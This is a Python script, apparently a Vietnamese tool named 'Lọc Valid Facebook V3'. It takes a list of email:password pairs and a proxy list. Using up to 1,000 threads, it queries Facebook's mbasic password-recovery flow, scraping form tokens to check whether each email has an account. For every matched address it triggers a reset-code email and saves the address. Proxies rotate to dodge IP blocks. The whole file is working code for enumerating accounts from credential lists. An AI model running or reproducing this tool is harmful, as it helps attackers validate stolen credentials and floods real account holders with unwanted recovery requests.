# https://github.com/im-razvan/Python-Obfuscator

#==Màu==#
do = "\033[1;91m"
trang = "\033[1;37m"
xanhbien = "\033[1;36m"
vang = "\033[0;33m"
hong = "\033[1;35m"
xanhduong = "\033[1;34m"
xanhla = "\033[1;32m"
xanh="\033[1;32m"
cam="\033[1;33m"
blue="\033[1;34m"
lam="\033[1;34m"
tim="\033[1;34m"
syan="\033[1;36m"
xnhac= "\033[1;96m"
den="\033[1;90m"
luc="\033[1;92m"
xduong="\033[1;94m"
import os, sys
try:
	from faker import Faker
	from time import sleep
	from requests import session
	from colorama import Fore, Style
	import requests, random, re
	import socket 
	from random import randint
	import concurrent.futures
except:
	os.system("pip install faker")
	os.system("pip install requests")
	os.system("pip install colorama")
	from requests import session
	from colorama import Fore, Style
	import requests, random, re
	from random import randint
	import concurrent.futures
def clear():
	if os.name=='nt':os.system('cls')
	else:os.system('clear')
clear()

def CHECKLK_2(x):
	mailer = x["mail"]
	fileluu = x["file"]
	pro = {
	"http":"http://"+x["proxy"],
	"https":"http://"+x["proxy"]
	}
	head = {

	"Host":"mbasic.facebook.com",
	"cache-control":"max-age=0",
	"upgrade-insecure-requests":"1",
	"origin":"https://mbasic.facebook.com",
	"content-type":"application/x-www-form-urlencoded",
	"user-agent":"Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36",
	"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
	"x-requested-with":"mark.via.gp",
	"sec-fetch-site":"same-origin",
	"sec-fetch-mode":"navigate",
	"sec-fetch-user":"?1",
	"sec-fetch-dest":"document",
	"referer":"https://mbasic.facebook.com/login/identify/?ctx=recover&search_attempts=0&ars=facebook_login&alternate_search=0&toggle_search_mode=1",
	"accept-encoding":"gzip, deflate",
	"accept-language":"vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7"
	}
	get = requests.get(url="https://mbasic.facebook.com/login/identify/", headers=head, proxies=pro)
	cookie = "datr="+get.cookies.get_dict()["datr"]+";"
	X = get.text
	lsd = X.split('name="lsd" value="')[1].split('"')[0]
	jazoest = X.split('name="jazoest" value="')[1].split('"')[0]
	data = {
	"lsd":lsd,
	"jazoest":jazoest,
	"email":mailer,
	"did_submit":"Tìm kiếm"
	}
	head = {
	"Host":"mbasic.facebook.com",
	"cache-control":"max-age=0",
	"upgrade-insecure-requests":"1",
	"origin":"https://mbasic.facebook.com",
	"content-type":"application/x-www-form-urlencoded",
	"user-agent":"Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36",
	"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
	"x-requested-with":"mark.via.gp",
	"sec-fetch-site":"same-origin",
	"sec-fetch-mode":"navigate",
	"sec-fetch-user":"?1",
	"sec-fetch-dest":"document",
	"referer":"https://mbasic.facebook.com/login/identify/?ctx=recover&search_attempts=0&ars=facebook_login&alternate_search=0&toggle_search_mode=1",
	"accept-encoding":"gzip, deflate",
	"accept-language":"vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7",
	"cookie":cookie
	}
	loc = requests.post("https://mbasic.facebook.com/login/identify/?ctx=recover&c=%2Flogin%2F&search_attempts=1&ars=facebook_login&alternate_search=1&show_friend_search_filtered_list=0&birth_month_search=0&city_search=0", headers=head, proxies=pro, data=data)
	if "Tìm kiếm không trả về kết quả nào. Vui lòng thử lại với thông tin khác." in loc.text:
		print(do+"Mail | "+mailer+" | Chưa Liên Kết")
	elif "Đặt lại mật khẩu của bạn" in loc.text:
		datack = loc.cookies.get_dict()
		sfiu = "sfiu="+datack["sfiu"]+";"
		datr = "datr="+datack["datr"]+";"
		sb = "sb="+datack["sb"]+";"
		cookie = datr+" "+sfiu+" "+sb
		X = loc.text
		lsd = X.split('name="lsd" value="')[1].split('"')[0]
		jazoest = X.split('name="jazoest" value="')[1].split('"')[0]
		data = {
		"lsd":lsd,
		"jazoest":jazoest,
		"recover_method":"send_email",
		"reset_action":"Tiếp tục"
		}
		head = {
		"Host":"mbasic.facebook.com",
		"cache-control":"max-age=0",
		"upgrade-insecure-requests":"1",
		"origin":"https://mbasic.facebook.com",
		"content-type":"application/x-www-form-urlencoded",
		"user-agent":"Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36",
		"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
		"x-requested-with":"mark.via.gp",
		"sec-fetch-site":"same-origin",
		"sec-fetch-mode":"navigate",
		"sec-fetch-user":"?1",
		"sec-fetch-dest":"document",
		"referer":"https://mbasic.facebook.com/recover/initiate/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNjc4MzI1NzY2LCJjYWxsc2l0ZV9pZCI6NDc4NzQ0MjE2MzY0ODU4fQ%3D%3D&c=%2Flogin%2F&fl=facebook_login&ctx=strong_rec_try_another_way&ars=facebook_login&ram=oauth",
		"accept-encoding":"gzip, deflate",
		"accept-language":"vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7",
		"cookie":cookie
		}
		checkcode = requests.post("https://mbasic.facebook.com/ajax/recover/initiate/?c=%2Flogin%2F&sr=0&ars=facebook_login", headers=head, proxies=pro, data=data)
		with open(fileluu, 'a') as f:
			f.write(mailer)
		if "Mã gồm 6 chữ số" in checkcode.text:
			print(xanhla+"Mail | "+mailer+" | Đã Liên Kết | Code = 6 | "+x["proxy"])
		else:
			print(syan+"Mail | "+mailer+" | Đã Liên Kết | Code = 8 | "+x["proxy"])
	elif "Bạn tạm thời bị chặn" in loc:
		print(do+"ĐÃ BỊ BLOCK IP")
def LOCLK(list, fileluu, filepro):
	listhot = []
	listpro = []
	for x in filepro:
		listpro.append(x)
	for i in list:
		mailer = i.split(":")[0]
		mk = i.split(":")[1]
		proxy = random.choice(listpro)
		listhot.append({"file":fileluu,"mail":mailer,"proxy":proxy})
	with concurrent.futures.ThreadPoolExecutor(max_workers=1000) as executor:
		executor.map(CHECKLK_2, listhot)
def MENUHOT():
	print("""
			\033[1;36m╭─⋞─────────────────────────────────────────────────────╮
            \033[1;31m███╗   ██╗ █████╗ ███╗   ███╗    ██████  ███████╗██╗   ██╗          
            \033[1;32m████╗  ██║██╔══██╗████╗ ████║    ██╔══██╗██╔════╝██║   ██║          
            \033[1;33m██╔██╗ ██║███████║██╔████╔██║    ██║  ██║█████╗  ╚██╗ ██╔╝          
            \033[1;34m██║╚██╗██║██╔══██║██║╚██╔╝██║    ██║  ██║██╔══╝   ╚████╔╝           
            \033[1;35m██║ ╚████║██║  ██║██║ ╚═╝ ██║    ██████╔╝███████╗  ╚██╔╝            
            \033[1;36m╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝     ╚═╝    ╚═════╝ ╚══════╝   ╚═╝   
            \033[1;34m Youtube : \033[1;37mhttps://youtube.com/@NamTool1
            \033[1;34m Nhóm Zalo : \033[1;37mhttps://zalo.me/g/kfmgqm225
            \033[1;34m Facebook   : \033[1;37mhttps://facebook.com/nam.nhn131 
            \033[1;36m╰─────────────────────────────────────────────────────⋟─╯ 
            \033[1;31m    TOOL LỌC VALID FACEBOOK V3
            \033[1;36m╰─────────────────────────────────────────────────────⋟─╯""")
	file = open(input("\033[1;37mNhập Tên File Chứa Mail : \033[1;33m")).readlines()
	fileluu = input("\033[1;37mNhập Tên File Lưu Mail liên Kết: \033[1;33m")
	filepro = open(input("\033[1;37mNhập File Chứa Proxy: \033[1;33m")).readlines()
	LOCLK(file, fileluu, filepro)
MENUHOT()
